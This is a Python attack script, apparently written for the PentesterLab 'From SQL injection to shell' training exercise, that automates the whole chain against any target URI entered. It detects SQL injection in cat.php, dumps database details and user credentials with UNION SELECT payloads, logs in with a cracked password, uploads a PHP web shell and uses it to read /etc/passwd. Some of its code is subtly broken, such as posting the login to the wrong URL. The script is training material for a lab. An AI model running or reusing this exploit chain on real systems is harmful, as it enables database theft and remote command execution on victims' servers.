#!/usr/bin/python3
import sys
import requests
import re
from bs4 import BeautifulSoup

# ---------------------------------------------------------------------------------
#  Automated Exploit for
#  "From SQL injection to shell" exercise - https://www.pentesterlab.com
# ---------------------------------------------------------------------------------
#  0xEval - (@0xEval)
# ---------------------------------------------------------------------------------

print("""
███████╗ ██████╗ ██╗     ██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗
██╔════╝██╔═══██╗██║     ╚════██╗██╔════╝██║  ██║██╔════╝██║     ██║
███████╗██║   ██║██║      █████╔╝███████╗███████║█████╗  ██║     ██║
╚════██║██║▄▄ ██║██║     ██╔═══╝ ╚════██║██╔══██║██╔══╝  ██║     ██║
███████║╚██████╔╝███████╗███████╗███████║██║  ██║███████╗███████╗███████╗
╚══════╝ ╚══▀▀═╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
by Eval
- credits to Pentesterlab.com for the exercise and (@_pr0n_) for the inspiration
""")

# ---------------------------------------------------------------------------------
# Payloads
db_info   = "database(),0x3a,version(),0x3a,user()"
db_creds  = "login,0x3a,password"
web_shell = "<?php system($_GET['cmd']); ?>"
# ---------------------------------------------------------------------------------

print("Enter the URI of the target")
target = input('> http://')
target = "http://" + target if not target.startswith('http://') else target

print("\n[+] Searching for SQLi vulnerability...")
payload = target + "/cat.php?id={id}{payload}".format(id=1, payload="\'")
vulnerable = re.search(r'error', requests.get(payload).text)
if not vulnerable:
    print("[x] No vulnerability found... Whoops !")
    sys.exit(-1)
else:
    print("[+] Target seems to be vulnerable !")

# ---------------------------------------------------------------------------------

print("\n[+] Dumping Database information...")

sqli = " UNION SELECT 1,concat({}),3,4".format(db_info)
payload = target + "/cat.php?id={id}{payload}".format(id=0, payload=sqli)
strings = BeautifulSoup(requests.get(payload).text, 'lxml').stripped_strings

for s in strings:
    if (re.search(r'^Picture: ', s)):
        infos = s.replace(' ', '').split(':')[1:]

print("  [*] Database Name    : " + infos[0])
print("  [*] Database User    : " + infos[1])
print("  [*] Database Version : " + infos[2])

# ---------------------------------------------------------------------------------

print("\n[+] Dumping Database credentials ...")

sqli = " UNION SELECT 1,concat({}),3,4 FROM users".format(db_creds)
payload = target + "/cat.php?id={id}{payload}".format(id=0, payload=sqli)
strings = BeautifulSoup(requests.get(payload).text, 'lxml').stripped_strings

for s in strings:
    if (re.search(r'^Picture: ', s)):
        infos = s.replace(' ', '').split(':')[1:]

print("  [*] Username      : " + infos[0])
print("  [*] Password Hash : " + infos[1])

# ---------------------------------------------------------------------------------

print("\n[+] Accessing Administration Page...")
login = infos[1]
password = "P4ssw0rd" # Courtesy of CrackStation (too lazy to use John)
print("  [*] Password Hash    : " + login)
print("  [*] Cracked Password : " + password)

payload = target + "/admin/login.php"
request = requests.post(target, data = {
    'user':login,
    'password':password
})

if request.status_code == 200:
    print("  [*] Login Successful !")
else:
    print("  [x] Login Failed... Aborting.")
    sys.exit(-1)

# ---------------------------------------------------------------------------------

print("\n[+] Uploading Web Shell...")
with open("web_shell.php3", 'w') as f:
    f.write(web_shell)

payload = target + "/admin/index.php"
request = requests.post(payload, data = {
    'title':'shell',
    'image':web_shell,
    'category':'1',
    'Add':'Add'
})

if request.status_code == 200:
    print("  [*] Upload Successful !")
else:
    print("  [x] Upload Failed ... Aborting.")
    sys.exit(-1)

# ---------------------------------------------------------------------------------

print("\n[+] OOOOOOOOoooooooooohh baby !")

payload = target + "/admin/uploads/web_shell.php3?cmd=cat /etc/passwd"
request = requests.get(payload)
print("  [*] Saving /etc/passwd to passwd_dump")
with open("passwd_dump", "w") as f:
    f.write(request.text)
